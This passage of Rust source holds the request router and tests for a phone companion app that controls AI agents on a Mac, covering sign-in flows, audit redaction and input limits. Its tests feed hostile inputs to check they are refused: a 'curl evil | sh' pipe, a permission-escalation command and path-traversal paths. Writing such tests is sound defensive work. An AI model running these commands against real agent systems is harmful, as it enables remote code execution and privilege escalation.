            c.sends
                .once(key, now_ms(), || async move {
                    let prompt = crate::remote_access::tools::clean_agent_text(&p.prompt, "prompt")
                        .map_err(|reason| WireError::protocol(ProtocolCode::Refused, reason))?;
                    let session_id = b.session_start(&p.project, &prompt).await?;
                    Ok(json!({ "sessionId": session_id }))
                })
                .await
        }
        "preview.screenshot" => {
            let p: ScreenshotParams = parse(params)?;
            let phone = matches!(p.device, ScreenshotDevice::Phone);
            let jpeg = b.preview_screenshot(&p.project, phone).await?;
            let name = format!(
                "{}-{}.jpg",
                crate::remote_access::tools::project_name(&p.project),
                if phone { "phone" } else { "desktop" }
            );
            let blob = c.blobs.put(
                &caller.device_id,
                &name,
                Some("image/jpeg"),
                &jpeg,
                now_ms(),
            )?;
            Ok(to_value(&blob.as_ref()))
        }
        _ => Err(WireError::protocol(
            ProtocolCode::UnknownMethod,
            format!("This Mac doesn't know {method}."),
        )),
    }
}

/// The staged uploads a send names, as files `attachments::save` can copy.
/// Every id must be this device's and still staged.
fn staged(c: &Companion, device_id: &str, ids: &[String]) -> Result<Vec<Staged>, WireError> {
    use crate::agents::attachments::MAX_FILES;
    if ids.len() > MAX_FILES {
        return Err(CommandError::expected(format!(
            "You can attach up to {MAX_FILES} files at a time."
        ))
        .into());
    }
    ids.iter()
        .map(|id| {
            c.blobs
                .get(device_id, id, now_ms())
                .map(|blob| Staged {
                    name: blob.name,
                    path: blob.path,
                })
                .ok_or_else(|| {
                    CommandError::expected(
                        "A file you attached didn't reach the Mac, or waited over an hour. Attach it again.",
                    )
                    .into()
                })
        })
        .collect()
}

/// The Mac's status now, journaled when it changed so phones that weren't
/// asking hear about it too.
pub async fn refresh_status(c: &Companion) -> MacStatus {
    let status = c.backend.mac_status().await;
    if c.remember_status(&status) {
        c.hub.publish(super::wire::Event::System {
            status: status.clone(),
        });
    }
    status
}

fn to_value<T: serde::Serialize>(v: &T) -> Value {
    serde_json::to_value(v).unwrap_or(Value::Null)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn audit_lines_preview_what_was_typed_and_name_the_answer() {
        assert_eq!(
            audit_detail("agents.send", &json!({ "text": "fix\n the   header" })),
            "fix the header"
        );
        let a = |p: Value| audit_detail("agents.answerApproval", &p);
        assert_eq!(a(json!({ "allow": true })), "allow");
        assert_eq!(a(json!({ "allow": true, "always": true })), "always allow");
        assert_eq!(a(json!({ "allow": false })), "deny");
        assert_eq!(
            a(json!({ "allow": false, "note": "use pnpm" })),
            "deny with note: use pnpm"
        );
        assert_eq!(
            audit_detail("agents.stop", &json!({ "agentId": "a1" })),
            "a1"
        );
    }

    fn caller(device: &str) -> Caller {
        Caller {
            device_id: device.into(),
            device_name: "Test Phone".into(),
            label: format!("companion:{device}:1"),
            route: crate::companion::wire::RouteKind::Tailscale,
            shows: Default::default(),
        }
    }

    #[tokio::test]
    async fn a_secret_goes_only_over_tailscale_and_no_value_reaches_the_audit() {
        use crate::companion::testkit::{Stub, AGENT};
        let (c, stub) = Stub::companion();
        let save = |values: Value| json!({ "agentId": AGENT, "requestId": "q8", "values": values });
        let me = caller("dev_a");
        let saved = dispatch(
            &c,
            &me,
            "agents.saveSecret",
            save(json!(["julian", "hunter2"])),
        )
        .await
        .unwrap();
        assert_eq!(saved["name"], "Stripe key");
        assert_eq!(
            stub.secrets_saved.load(std::sync::atomic::Ordering::SeqCst),
            1
        );
        // A malformed request is refused without quoting what it carried.
        let bad = dispatch(&c, &me, "agents.saveSecret", save(json!("hunter2")))
            .await
            .unwrap_err();
        assert!(!bad.summary().contains("hunter2"));
        let extra = json!({ "agentId": AGENT, "requestId": "q8", "values": ["a"], "v": "hunter2" });
        assert!(!dispatch(&c, &me, "agents.saveSecret", extra)
            .await
            .unwrap_err()
            .summary()
            .contains("hunter2"));
        for (_, method, detail, _) in stub.audited() {
            assert_eq!(method, "agents.saveSecret");
            assert!(
                !detail.contains("hunter2") && !detail.contains("julian"),
                "{detail}"
            );
        }
        assert_eq!(stub.audited().len(), 3);
    }

    /// The phone answers a login card: Connect starts it on the Mac, the
    /// team list connects a row, "Not needed" puts one away, a key never
    /// reaches the audit, and "What it can reach" is read-only.
    #[tokio::test]
    async fn a_login_card_is_answered_from_the_phone_and_runs_on_the_mac() {
        use crate::companion::testkit::{Stub, AGENT};
        let (c, stub) = Stub::companion();
        let me = caller("dev_a");
        let card = json!({ "agentId": AGENT, "requestId": "q12", "optionId": "claude_ai" });
        assert_eq!(
            dispatch(&c, &me, "agents.loginStart", card).await.unwrap(),
            Value::Null
        );
        // A way in must be named.
        assert!(dispatch(
            &c,
            &me,
            "agents.loginStart",
            json!({ "agentId": AGENT, "requestId": "q12" })
        )
        .await
        .is_err());
        dispatch(
            &c,
            &me,
            "agents.loginCancel",
            json!({ "agentId": AGENT, "requestId": "q12" }),
        )
        .await
        .unwrap();
        dispatch(
            &c,
            &me,
            "agents.loginsConnect",
            json!({ "key": "google", "optionId": "claude_ai", "skip": ["agent_c"] }),
        )
        .await
        .unwrap();
        dispatch(
            &c,
            &me,
            "agents.loginDismiss",
            json!({ "agentId": AGENT, "requestId": "q20" }),
        )
        .await
        .unwrap();
        dispatch(
            &c,
            &me,
            "agents.loginSaveKey",
            json!({ "agentId": AGENT, "requestId": "q12", "value": "xai-secret-value-123" }),
        )
        .await
        .unwrap();
        assert_eq!(
            stub.logins.lock().unwrap().as_slice(),
            [
                "start q12 claude_ai",
                "cancel q12",
                "team google claude_ai",
                "dismiss q20",
                "key q12"
            ]
        );
        let team = dispatch(&c, &me, "agents.loginsTeam", json!({}))
            .await
            .unwrap();
        assert_eq!(team["needs"][0]["title"], "Google · Gmail + Calendar");
        let reach = dispatch(&c, &me, "agents.reach", json!({ "agentId": AGENT }))
            .await
            .unwrap();
        assert_eq!(reach["connections"][0]["account"], "work@acme.com");
        // Not needed: a card's service, a row, the rest; then Undo.
        let receipt = dispatch(
            &c,
            &me,
            "agents.loginNotNeeded",
            json!({ "agentId": AGENT, "requestId": "q21" }),
        )
        .await
        .unwrap();
        assert_eq!(receipt["keys"][0], "other:acme bank");
        dispatch(
            &c,
            &me,
            "agents.loginsNotNeeded",
            json!({ "keys": ["slack"] }),
        )
        .await
        .unwrap();
        dispatch(&c, &me, "agents.loginsNotNeeded", json!({}))
            .await
            .unwrap();
        assert!(
            dispatch(&c, &me, "agents.loginsUndecline", json!({ "keys": [] }))
                .await
                .is_err(),
            "an Undo names what it turns back on"
        );
        let back = dispatch(
            &c,
            &me,
            "agents.loginsUndecline",
            json!({ "keys": ["slack"] }),
        )
        .await
        .unwrap();
        assert_eq!(back, json!(1));
        assert_eq!(
            stub.logins.lock().unwrap()[5..],
            [
                "not needed q21",
                "not needed rows slack",
                "not needed rows linkedin",
                "undecline slack"
            ]
        );
        let audited = stub.audited();
        assert!(audited
            .iter()
            .all(|(_, _, detail, _)| !detail.contains("xai-secret-value")));
        // Reads aren't audited; every change is.
        assert!(!audited
            .iter()
            .any(|(_, m, _, _)| m == "agents.reach" || m == "agents.loginsTeam"));
        assert!(audited.iter().any(|(_, m, _, _)| m == "agents.loginStart"));
        assert!(!serde_json::to_string(&reach)
            .unwrap()
            .to_lowercase()
            .contains("token\""));
    }

    /// Signing in on the Mac's Chrome from the phone: every call carries the
    /// caller's own device id, what's typed never reaches the audit or the
    /// backend's record, and nothing past the parse is echoed back.
    #[tokio::test]
    async fn a_phone_sign_in_in_the_macs_chrome_never_audits_or_echoes_what_is_typed() {
        use crate::companion::testkit::{Stub, AGENT};
        let (c, stub) = Stub::companion();
        let me = caller("dev_a");
        let secret = "correct-horse-battery-staple";
        let begun = dispatch(
            &c,
            &me,
            "agents.signinBegin",
            json!({ "agentId": AGENT, "requestId": "q12" }),
        )
        .await
        .unwrap();
        let id = begun["sessionId"].as_str().unwrap().to_string();
        dispatch(&c, &me, "agents.signinFrame", json!({ "sessionId": id }))
            .await
            .unwrap();
        for input in [
            json!({ "kind": "tap", "x": 10, "y": 20 }),
            json!({ "kind": "type", "text": secret, "secure": true }),
            json!({ "kind": "key", "key": "enter" }),
            json!({ "kind": "back" }),
        ] {
            dispatch(
                &c,
                &me,
                "agents.signinInput",
                json!({ "sessionId": id, "input": input }),
            )
            .await
            .unwrap();
        }
        // Refused at the parse, without saying what it was.
        for bad in [
            json!({ "sessionId": id, "input": { "kind": "key", "key": "cmd+l", "text": secret } }),
            json!({ "sessionId": id, "input": { "kind": "navigate", "url": secret } }),
            json!({ "sessionId": "", "input": { "kind": "type", "text": secret } }),
        ] {
            let e = dispatch(&c, &me, "agents.signinInput", bad)
                .await
                .unwrap_err();
            assert!(!format!("{e:?}").contains(secret));
        }
        dispatch(&c, &me, "agents.signinDone", json!({ "sessionId": id }))
            .await
            .unwrap();
        dispatch(&c, &me, "agents.signinStop", json!({ "sessionId": id }))
            .await
            .unwrap();
        let record = stub.logins.lock().unwrap().join("\n");
        assert!(!record.contains(secret), "{record}");
        assert!(record.lines().all(|l| l.ends_with("by dev_a")), "{record}");
        assert!(
            record.contains("Type { chars: 28, secure: true }"),
            "{record}"
        );
        // The router writes no line for any of it: the session writes its own.
        let audited = stub.audited();
        assert!(
            audited
                .iter()
                .all(|(_, m, d, _)| !m.starts_with("agents.signin") && !d.contains(secret)),
            "{audited:?}"
        );
        assert_eq!(
            audit_detail("agents.signinInput", &json!({ "text": secret })),
            "phone sign-in"
        );
        for m in SELF_AUDITED_METHODS {
            assert!(METHODS.contains(m));
            assert!(!READ_ONLY_METHODS.contains(m));
        }
    }

    /// Signing in on the phone itself: the sheet is begun for the caller's
    /// own device, its answer is relayed with the caller's device id, and
    /// neither the URL nor the code ever reaches the audit.
    #[tokio::test]
    async fn a_phone_sign_in_is_bound_to_its_device_and_never_audited_with_its_code() {
        use crate::companion::testkit::{Stub, AGENT};
        let (c, stub) = Stub::companion();
        let me = caller("dev_a");
        let begun = dispatch(
            &c,
            &me,
            "agents.loginPhoneBegin",
            json!({ "agentId": AGENT, "requestId": "q12", "optionId": "oauth" }),
        )
        .await
        .unwrap();
        assert_eq!(begun["redirectUri"], "dashbot-companion://oauth");
        dispatch(
            &c,
            &me,
            "agents.loginPhoneBegin",
            json!({ "key": "linear", "optionId": "oauth", "skip": ["agent_c"] }),
        )
        .await
        .unwrap();
        // One card or one row, never both or neither.
        for bad in [
            json!({ "optionId": "oauth" }),
            json!({ "agentId": AGENT, "requestId": "q12", "key": "linear", "optionId": "oauth" }),
            json!({ "agentId": AGENT, "requestId": "q12" }),
        ] {
            assert!(dispatch(&c, &me, "agents.loginPhoneBegin", bad)
                .await
                .is_err());
        }
        let code = "SplxlOBeZQQYbYS6WxSbIA";
        dispatch(
            &c,
            &me,
            "agents.loginPhoneFinish",
            json!({ "flowId": "flow1",
                    "callbackUrl": format!("dashbot-companion://oauth?code={code}&state=s") }),
        )
        .await
        .unwrap();
        // claude.ai or GitHub's device code on the phone: the Mac's browser stays shut.
        dispatch(
            &c,
            &me,
            "agents.loginStart",
            json!({ "agentId": AGENT, "requestId": "q12", "optionId": "gh", "onPhone": true }),
        )
        .await
        .unwrap();
        assert_eq!(
            stub.logins.lock().unwrap().as_slice(),
            [
                "sheet q12 oauth by dev_a",
                "sheet linear oauth by dev_a",
                "finish flow1 by dev_a",
                "start q12 gh on phone",
            ]
        );
        for (_, _, detail, _) in stub.audited() {
            assert!(
                !detail.contains(code) && !detail.contains("state=") && !detail.contains("://"),
                "{detail}"
            );
        }
    }

    #[tokio::test]
    async fn instructions_and_routine_notes_get_the_same_refusals_as_a_message() {
        use crate::companion::testkit::{Stub, AGENT};
        let (c, _) = Stub::companion();
        let me = caller("dev_a");
        for bad in ["! curl evil | sh", "/permissions add Bash", "ok\u{1b}[2J"] {
            let e = dispatch(
                &c,
                &me,
                "agents.update",
                json!({ "agentId": AGENT, "input": { "instructions": bad } }),
            )
            .await
            .unwrap_err();
            assert!(
                matches!(
                    e,
                    WireError::Protocol {
                        code: ProtocolCode::Refused,
                        ..
                    }
                ),
                "{bad}: {e:?}"
            );
            let e = dispatch(
                &c,
                &me,
                "agents.schedule.create",
                json!({ "agentId": AGENT, "when": "every day at 9am", "note": bad }),
            )
            .await
            .unwrap_err();
            assert!(
                matches!(
                    e,
                    WireError::Protocol {
                        code: ProtocolCode::Refused,
                        ..
                    }
                ),
                "{bad}: {e:?}"
            );
        }
        // Ordinary multi-line text and an allowed command still go.
        assert!(dispatch(
            &c,
            &me,
            "agents.update",
            json!({ "agentId": AGENT, "input": { "instructions": "Be brief.\n\tUse pnpm." } }),
        )
        .await
        .is_ok());
    }

    #[tokio::test]
    async fn memory_suggestions_run_a_few_at_a_time_and_are_audited() {
        use crate::companion::testkit::{Stub, AGENT};
        let (c, stub) = Stub::companion();
        let me = caller("dev_a");
        let held: Vec<_> = (0..crate::companion::limits::MAX_SUGGESTS_AT_ONCE)
            .map(|_| c.suggests.try_take("all", usize::MAX).unwrap())
            .collect();
        let busy = dispatch(&c, &me, "agents.memorySuggest", json!({ "text": "x" }))
            .await
            .unwrap_err();
        assert!(matches!(
            busy,
            WireError::Protocol {
                code: ProtocolCode::RateLimited,
                ..
            }
        ));
        drop(held);
        dispatch(
            &c,
            &me,
            "agents.memorySuggest",
            json!({ "text": "Remember pnpm" }),
        )
        .await
        .unwrap();
        let _ = AGENT;
        assert!(stub
            .audited()
            .iter()
            .any(|a| a.1 == "agents.memorySuggest" && a.3));
    }

    #[tokio::test]
    async fn a_phone_creates_an_agent_once_per_client_id_and_it_is_audited() {
        use crate::companion::testkit::Stub;
        let (c, stub) = Stub::companion();
        let me = caller("dev_a");
        let params = json!({
            "input": { "name": "  Inbox ", "role": "Keeps my inbox\n down to what matters", "color": "teal" },
            "clientId": "new-1",
        });
        let made = dispatch(&c, &me, "agents.create", params.clone())
            .await
            .unwrap();
        assert_eq!(made["name"], "Inbox");
        assert_eq!(made["role"], "Keeps my inbox down to what matters");
        assert_eq!(made["color"], "teal");
        assert!(made.get("usage").is_none(), "a StoredAgent has no usage");
        // A retry after a dropped socket is the same agent, not a second.
        let again = dispatch(&c, &me, "agents.create", params).await.unwrap();
        assert_eq!(made, again);
        assert_eq!(stub.created.lock().unwrap().len(), 1);
        let audited = stub.audited();
        assert_eq!(audited[0].1, "agents.create");
        assert_eq!(
            audited[0].2,
            "create Inbox — Keeps my inbox down to what matters"
        );
        assert!(audited[0].3);
        assert!(super::METHODS.contains(&"agents.create"));
        assert!(!super::READ_ONLY_METHODS.contains(&"agents.create"));
    }

    #[tokio::test]
    async fn a_phone_made_agent_takes_only_a_name_role_and_colour() {
        use crate::companion::testkit::Stub;
        let (c, stub) = Stub::companion();
        let me = caller("dev_a");
        let create = |input: Value| dispatch(&c, &me, "agents.create", json!({ "input": input }));
        // The engine, model and project stay the desk's.
        for extra in [
            json!({ "name": "Ops", "engine": "codex" }),
            json!({ "name": "Ops", "model": "opus" }),
            json!({ "name": "Ops", "project": "/etc" }),
            json!({ "name": "Ops", "instructions": "x" }),
        ] {
            let refused = create(extra).await.unwrap_err();
            assert!(refused.summary().contains("name, what it should do"));
        }
        assert!(create(json!({ "name": "   " }))
            .await
            .unwrap_err()
            .summary()
            .contains("Give the agent a name"));
        assert!(create(json!({ "name": "x".repeat(41) })).await.is_err());
        assert!(create(json!({ "name": "Ops", "role": "x".repeat(501) }))
            .await
            .is_err());
        assert!(create(json!({ "name": "Ops", "color": "chartreuse" }))
            .await
            .unwrap_err()
            .summary()
            .contains("isn't one of the agent colours"));
        assert!(create(json!({ "name": "Ops\u{1b}[2J" })).await.is_err());
        // The desk's own refusal comes back as it is.
        assert!(create(json!({ "name": "finance" }))
            .await
            .unwrap_err()
            .summary()
            .contains("already an agent called"));
        assert!(stub.created.lock().unwrap().is_empty());
        // No colour picked: the backend chooses, as the desk does.
        let made = create(json!({ "name": "Ops" })).await.unwrap();
        assert_eq!(stub.created.lock().unwrap()[0].color, None);
        assert_eq!(made["role"], "");
        // Refusals are audited too, as failures.
        assert!(stub
            .audited()
            .iter()
            .any(|(_, m, _, ok)| m == "agents.create" && !ok));
    }

    #[tokio::test]
    async fn a_phone_sets_new_agents_defaults_as_the_desk_checks_them() {
        use crate::companion::testkit::Stub;
        let (c, stub) = Stub::companion();
        let me = caller("dev_a");
        let set = |params: Value| dispatch(&c, &me, "agents.setDefaults", params);
        // Read with the overview: what's chosen, and where new agents start.
        let overview = dispatch(&c, &me, "agents.overview", json!({}))
            .await
            .unwrap();
        assert_eq!(overview["defaults"]["engine"], "codex");
        assert_eq!(overview["defaults"]["startsOn"], "claude");
        assert_eq!(overview["defaults"]["model"], "opus");
        // Nothing, or anything else, is refused before the Mac sees it.
        assert!(set(json!({})).await.is_err());
        assert!(set(json!({ "model": "opus" })).await.is_err());
        assert!(set(json!({ "engine": 3 })).await.is_err());
        assert!(stub.defaults.lock().unwrap().is_empty());
        // The Mac's own refusal (a signed-out engine) comes back as it is.
        assert!(set(json!({ "engine": "codex" }))
            .await
            .unwrap_err()
            .summary()
            .contains("isn't signed in"));
        let view = set(json!({ "engine": "claude", "claudeModel": "" }))
            .await
            .unwrap();
        assert_eq!(view["startsOn"], "claude");
        let sent = stub.defaults.lock().unwrap().clone();
        assert_eq!(sent.len(), 1);
        assert_eq!(sent[0].engine.as_deref(), Some("claude"));
        assert_eq!(sent[0].claude_model.as_deref(), Some(""));
        // A settings write: audited, refusals included, in plain words.
        assert!(!READ_ONLY_METHODS.contains(&"agents.setDefaults"));
        let audited = stub.audited();
        assert!(audited
            .iter()
            .any(|(_, m, detail, ok)| m == "agents.setDefaults"
                && *ok
                && detail == "new agents: engine claude, Claude Code model default"));
        assert!(audited
            .iter()
            .any(|(_, m, _, ok)| m == "agents.setDefaults" && !ok));
    }

    #[tokio::test]
    async fn a_phone_reads_and_sets_how_independent_agents_are() {
        use crate::agents::independence::Level;
        use crate::companion::testkit::Stub;
        let (c, stub) = Stub::companion();
        let me = caller("dev_a");
        let overview = dispatch(&c, &me, "agents.overview", json!({}))
            .await
            .unwrap();
        assert_eq!(overview["independence"], "go_hard");
        let set = |params: Value| dispatch(&c, &me, "agents.setIndependence", params);
        assert!(set(json!({})).await.is_err());
        assert!(set(json!({ "level": "yolo" })).await.is_err());
        assert!(set(json!({ "level": 2 })).await.is_err());
        assert!(stub.independence.lock().unwrap().is_empty());
        let answer = set(json!({ "level": "often" })).await.unwrap();
        assert_eq!(answer["level"], "often");
        assert_eq!(*stub.independence.lock().unwrap(), vec![Level::Often]);
        assert!(!READ_ONLY_METHODS.contains(&"agents.setIndependence"));
        assert!(stub
            .audited()
            .iter()
            .any(|(_, m, detail, ok)| m == "agents.setIndependence"
                && *ok
                && detail == "independence: often"));
    }

    #[tokio::test]
    async fn a_phone_switches_admin_on_and_off_audited() {
        use crate::companion::testkit::Stub;
        let (c, stub) = Stub::companion();
        let me = caller("dev_a");
        let set = |params: Value| dispatch(&c, &me, "agents.setAdmin", params);
        assert!(set(json!({})).await.is_err());
        assert!(set(json!({ "agentId": "a1" })).await.is_err());
        assert!(set(json!({ "agentId": "a1", "admin": "yes" }))
            .await
            .is_err());
        let answer = set(json!({ "agentId": "a1", "admin": true }))
            .await
            .unwrap();
        assert_eq!(answer["admin"], true);
        assert_eq!(*stub.admins.lock().unwrap(), vec![("a1".to_string(), true)]);
        assert!(!READ_ONLY_METHODS.contains(&"agents.setAdmin"));
        assert!(stub
            .audited()
            .iter()
            .any(|(_, m, detail, ok)| m == "agents.setAdmin" && *ok && detail == "a1 admin on"));
    }

    #[tokio::test]
    async fn a_phone_can_start_from_a_ready_made_agent() {
        use crate::companion::testkit::Stub;
        let (c, stub) = Stub::companion();
        let me = caller("dev_a");
        // What the sheet offers: every template, without its briefing.
        let list = dispatch(&c, &me, "agents.templates", json!({}))
            .await
            .unwrap();
        let list = list.as_array().unwrap();
        assert_eq!(list.len(), crate::agents::templates::all().len());
        assert!(list.iter().all(|t| t.get("instructions").is_none()));
        assert!(list
            .iter()
            .any(|t| t["id"] == "inbox" && t["needs"] == "mail"));
        assert!(READ_ONLY_METHODS.contains(&"agents.templates"));
        // An unknown one is refused before the desk sees it.
        let refused = dispatch(
            &c,
            &me,
            "agents.create",
            json!({ "input": { "name": "Ops", "template": "astrologer" } }),
        )
        .await
        .unwrap_err();
        assert!(refused
            .summary()
            .contains("isn't one of the ready-made agents"));
        assert!(stub.created.lock().unwrap().is_empty());
        dispatch(
            &c,
            &me,
            "agents.create",
            json!({ "input": { "name": "Research", "role": "Looks things up", "template": " research " } }),
        )
        .await
        .unwrap();
        assert_eq!(
            stub.created.lock().unwrap()[0].template.as_deref(),
            Some("research")
        );
    }

    #[tokio::test]
    async fn a_phone_makes_at_most_ten_agents_a_minute() {
        use crate::companion::testkit::Stub;
        use crate::companion::MAX_AGENTS_CREATED_PER_MINUTE;
        let (c, stub) = Stub::companion();
        let me = caller("dev_a");
        for i in 0..MAX_AGENTS_CREATED_PER_MINUTE {
            let params =
                json!({ "input": { "name": format!("A{i}") }, "clientId": format!("c{i}") });
            dispatch(&c, &me, "agents.create", params).await.unwrap();
        }
        // A retry of one already made is the cache's answer, not an eleventh.
        let retry = json!({ "input": { "name": "A0" }, "clientId": "c0" });
        assert!(dispatch(&c, &me, "agents.create", retry).await.is_ok());
        let refused = dispatch(
            &c,
            &me,
            "agents.create",
            json!({ "input": { "name": "One more" } }),
        )
        .await
        .unwrap_err();
        assert!(
            refused.summary().contains("in a minute"),
            "{}",
            refused.summary()
        );
        assert!(matches!(
            refused,
            WireError::Protocol {
                code: ProtocolCode::RateLimited,
                ..
            }
        ));
        assert_eq!(
            stub.created.lock().unwrap().len(),
            MAX_AGENTS_CREATED_PER_MINUTE
        );
        // Another phone has its own minute, and the window rolls.
        let other = caller("dev_b");
        assert!(dispatch(
            &c,
            &other,
            "agents.create",
            json!({ "input": { "name": "B" } })
        )
        .await
        .is_ok());
        assert!(c.allow_create("dev_a", now_ms() + 60_000));
    }

    #[test]
    fn a_new_agent_starts_on_the_first_colour_nobody_wears() {
        let taken = |c: &[&str]| c.iter().map(|s| s.to_string()).collect::<Vec<_>>();
        assert_eq!(super::free_color(&[]), "brown");
        assert_eq!(
            super::free_color(&taken(&["white", "brown", "red"])),
            "orange"
        );
        let all: Vec<String> = crate::agents::store::COLORS
            .iter()
            .map(|s| s.to_string())
            .collect();
        assert_eq!(super::free_color(&all), "purple");
    }

    #[tokio::test]
    async fn a_session_question_is_answered_by_option() {
        use crate::companion::testkit::{Stub, AGENT};
        let (c, stub) = Stub::companion();
        let me = caller("dev_a");
        let params = json!({ "agentId": AGENT, "requestId": "q6", "allow": true, "choice": 1 });
        dispatch(&c, &me, "agents.answerApproval", params)
            .await
            .unwrap();
        assert_eq!(stub.answers.lock().unwrap()[0].choice, Some(1));
        assert_eq!(stub.audited()[0].2, "picked option 2");
    }

    #[tokio::test]
    async fn memory_changes_are_audited_and_kept_short() {
        use crate::companion::testkit::{Stub, AGENT};
        let (c, stub) = Stub::companion();
        let me = caller("dev_a");
        let add =
            |text: String| json!({ "agentId": AGENT, "change": { "op": "add", "text": text } });
        let view = dispatch(
            &c,
            &me,
            "agents.memoryChange",
            add("Ship on Fridays".into()),
        )
        .await
        .unwrap();
        assert_eq!(view["entries"].as_array().unwrap().len(), 4);
        assert_eq!(stub.audited()[0].2, "remember: Ship on Fridays");
        assert!(
            dispatch(&c, &me, "agents.memoryChange", add("x".repeat(2_001)))
                .await
                .is_err()
        );
        assert!(
            dispatch(&c, &me, "agents.memoryChange", add("a\u{1b}[2J".into()))
                .await
                .is_err()
        );
        // Reading isn't an action: not audited.
        dispatch(&c, &me, "agents.memory", json!({ "agentId": AGENT }))
            .await
            .unwrap();
        assert_eq!(stub.audited().len(), 3);
    }

    #[tokio::test]
    async fn a_send_echoes_its_client_id_and_a_retry_returns_the_same_message() {
        use crate::companion::testkit::{Stub, AGENT};
        let (c, stub) = Stub::companion();
        let (mut rx, _) = c.hub.resume(None);
        let me = caller("dev_a");
        let params = json!({ "agentId": AGENT, "text": "hello", "clientId": "c-42" });
        let first = dispatch(&c, &me, "agents.send", params.clone())
            .await
            .unwrap();
        assert_eq!(first["clientId"], "c-42");
        let again = dispatch(&c, &me, "agents.send", params).await.unwrap();
        assert_eq!(first, again);
        assert_eq!(stub.sends.load(std::sync::atomic::Ordering::SeqCst), 1);
        let mut journaled = None;
        while let Ok(item) = rx.try_recv() {
            if let super::super::hub::HubItem::Journaled {
                event: super::super::wire::Event::Message { message },
                ..
            } = item
            {
                if message["id"] == first["id"] {
                    journaled = Some(message);
                }
            }
        }
        assert_eq!(journaled.expect("journaled")["clientId"], "c-42");
    }

    #[tokio::test]
    async fn attachments_must_be_this_devices_staged_blobs_and_few_enough() {
        use crate::companion::testkit::{Stub, AGENT};
        let (c, _) = Stub::companion();
        let me = caller("dev_a");
        let send = |ids: Vec<String>, client: &str| {
            let attachments: Vec<Value> = ids.iter().map(|id| json!({ "blobId": id })).collect();
            json!({ "agentId": AGENT, "text": "", "clientId": client, "attachments": attachments })
        };
        let unknown = dispatch(&c, &me, "agents.send", send(vec!["blob_nope".into()], "c1")).await;
        assert!(unknown.unwrap_err().summary().contains("Attach it again"));

        let theirs = c.blobs.put("dev_b", "a.txt", None, b"x", now_ms()).unwrap();
        assert!(
            dispatch(&c, &me, "agents.send", send(vec![theirs.id], "c2"))
                .await
                .is_err()
        );

        let eleven: Vec<String> = (0..11)
            .map(|_| {
                c.blobs
                    .put("dev_a", "a.txt", None, b"x", now_ms())
                    .unwrap()
                    .id
            })
            .collect();
        let refused = dispatch(&c, &me, "agents.send", send(eleven, "c3")).await;
        assert!(refused.unwrap_err().summary().contains("up to 10 files"));

        // No files and no text is still refused.
        let empty = dispatch(&c, &me, "agents.send", send(Vec::new(), "c4")).await;
        assert!(empty.is_err());
    }

    #[tokio::test]
    async fn fetch_path_stages_a_file_for_this_device_and_refuses_folders() {
        use crate::companion::testkit::{Stub, AGENT};
        let (c, stub) = Stub::companion();
        std::fs::write(stub.home.path().join("report.md"), "# Q3").unwrap();
        std::fs::create_dir(stub.home.path().join("folder")).unwrap();
        let me = caller("dev_a");
        let blob = dispatch(
            &c,
            &me,
            "agents.fetchPath",
            json!({ "agentId": AGENT, "path": "report.md" }),
        )
        .await
        .unwrap();
        assert_eq!(blob["name"], "report.md");
        assert_eq!(blob["mime"], "text/markdown");
        assert_eq!(blob["size"], 4);
        let id = blob["blobId"].as_str().unwrap();
        assert!(c.blobs.get("dev_a", id, now_ms()).is_some());
        assert!(c.blobs.get("dev_b", id, now_ms()).is_none());
        for refused in ["folder", "/etc/hosts", "../outside.txt"] {
            assert!(
                dispatch(
                    &c,
                    &me,
                    "agents.fetchPath",
                    json!({ "agentId": AGENT, "path": refused })
                )
                .await
                .is_err(),
                "{refused}"
            );
        }
    }

    #[tokio::test]
    async fn schedule_methods_need_an_id_except_create() {
        use crate::companion::testkit::{Stub, AGENT};
        let (c, _) = Stub::companion();
        let me = caller("dev_a");
        let missing = dispatch(
            &c,
            &me,
            "agents.schedule.cancel",
            json!({ "agentId": AGENT }),
        )
        .await;
        assert!(missing.is_err());
        let made = dispatch(
            &c,
            &me,
            "agents.schedule.create",
            json!({ "agentId": AGENT, "when": "every weekday at 9am", "note": "Check the invoices" }),
        )
        .await
        .unwrap();
        assert_eq!(made["note"], "Check the invoices");
        assert_eq!(made["repeat"]["kind"], "days");
    }

    #[tokio::test]
    async fn the_agent_sheet_reads_usage_and_instructions_and_revokes() {
        use crate::companion::testkit::{Stub, AGENT};
        let (c, stub) = Stub::companion();
        let me = caller("dev_a");
        let brief = dispatch(&c, &me, "agents.instructions", json!({ "agentId": AGENT }))
            .await
            .unwrap();
        assert!(brief.as_str().unwrap().contains("invoices"));
        let usage = dispatch(&c, &me, "agents.usage", json!({ "agentId": AGENT }))
            .await
            .unwrap();
        assert_eq!(usage["week"]["turns"], 3);
        dispatch(
            &c,
            &me,
            "agents.revokePermission",
            json!({ "agentId": AGENT, "ruleId": "r1" }),
        )
        .await
        .unwrap();
        assert_eq!(stub.revoked.lock().unwrap().as_slice(), ["r1"]);
        let diff = dispatch(
            &c,
            &me,
            "agents.changeDiff",
            json!({ "agentId": AGENT, "messageId": "m-change", "path": "src/a.ts" }),
        )
        .await
        .unwrap();
        assert_eq!(diff["filePath"], "src/a.ts");
        // Reads aren't audited; the revoke is.
        let audit = stub.audited();
        assert_eq!(audit.len(), 1);
        assert_eq!(audit[0].1, "agents.revokePermission");
    }

    #[tokio::test]
    async fn keeping_and_discarding_a_copy_name_the_copy_and_are_audited() {
        use crate::companion::testkit::{Stub, AGENT};
        let (c, stub) = Stub::companion();
        let me = caller("dev_a");
        let kept = dispatch(
            &c,
            &me,
            "agents.keepCopy",
            json!({ "agentId": AGENT, "copyId": "copy-1" }),
        )
        .await
        .unwrap();
        assert_eq!(kept["outcome"], "kept");
        assert_eq!(kept["files"], 2);
        // Keeping into another branch names it: the confirmation travels.
        let into = dispatch(
            &c,
            &me,
            "agents.keepCopy",
            json!({ "agentId": AGENT, "copyId": "copy-1", "into": "feature" }),
        )
        .await
        .unwrap();
        assert_eq!(into["branch"], "feature");
        dispatch(
            &c,
            &me,
            "agents.discardCopy",
            json!({ "agentId": AGENT, "copyId": "copy-1" }),
        )
        .await
        .unwrap();
        // A card for a copy that's gone is refused, not applied to a newer one.
        assert!(dispatch(
            &c,
            &me,
            "agents.keepCopy",
            json!({ "agentId": AGENT, "copyId": "old" }),
        )
        .await
        .is_err());
        // The copy is named: a bare agent id is not enough.
        assert!(
            dispatch(&c, &me, "agents.discardCopy", json!({ "agentId": AGENT }))
                .await
                .is_err()
        );
        assert_eq!(
            *stub.copies.lock().unwrap(),
            vec![
                "keep copy-1".to_string(),
                "keep copy-1 into feature".to_string(),
